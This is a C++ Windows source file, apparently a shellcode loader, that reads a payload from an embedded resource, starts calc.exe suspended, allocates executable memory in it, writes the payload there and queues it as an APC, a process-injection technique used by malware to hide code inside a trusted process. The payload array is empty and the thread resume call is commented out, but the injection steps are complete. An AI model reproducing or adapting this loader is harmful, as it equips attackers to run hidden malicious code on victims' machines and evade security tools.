#include "pch.h"
#include <Windows.h>
#include <iostream>

int main()
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	
	char shellcode[] = "";

	int sc_len = sizeof(shellcode);
	VOID CALLBACK APCProc();
	
	HRSRC hRsc = FindResourceExW(NULL, RT_RCDATA, MAKEINTRESOURCE(101), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL));

	if (hRsc == 0)
	{
		int err = GetLastError();
		printf("FindResource Error: %d", err);
	}
	else
	{
		HGLOBAL hData = LoadResource(NULL, hRsc);
		if (hData == 0)
		{
			int err = GetLastError();
			printf("\nLoadResource Error: %d", err);
		}
		else
		{
			if (!CreateProcessA((LPCSTR)"C:\\Windows\\System32\\calc.exe", (LPSTR)NULL, (LPSECURITY_ATTRIBUTES)NULL, (LPSECURITY_ATTRIBUTES)NULL, (BOOL)FALSE, (DWORD)CREATE_SUSPENDED, (LPVOID)NULL, (LPCSTR)NULL, (LPSTARTUPINFOA)&si, (LPPROCESS_INFORMATION)&pi))
			{
				DWORD err = GetLastError();
				std::cout << "CreatProcess Err: " << err << std::endl;
			}
			else
			{
				DWORD sizeRsc = SizeofResource(NULL, hRsc);
				LPVOID addr = VirtualAllocEx(pi.hProcess, NULL, sizeRsc, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				if (addr == NULL)
				{
					DWORD err = GetLastError();
					std::cout << "VirtualAllocEx Err: " << err << std::endl;
				}
				else
				{
					if (!WriteProcessMemory(pi.hProcess, addr, hData, sizeRsc, NULL))
					{
						DWORD err = GetLastError();
						std::cout << "WriteProcessMemory Err " << err << std::endl;
					}
					else
					{
						PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)addr;
						if (!QueueUserAPC((PAPCFUNC)pfnThreadRtn, pi.hThread, NULL))
						{
							DWORD err = GetLastError();
							std::cout << "QueueUserAPC Err " << err << std::endl;
						}
						else
						{
							//ResumeThread(pi.hThread);
						}
					}
					}
			}
		}
	}
	return 0;
}
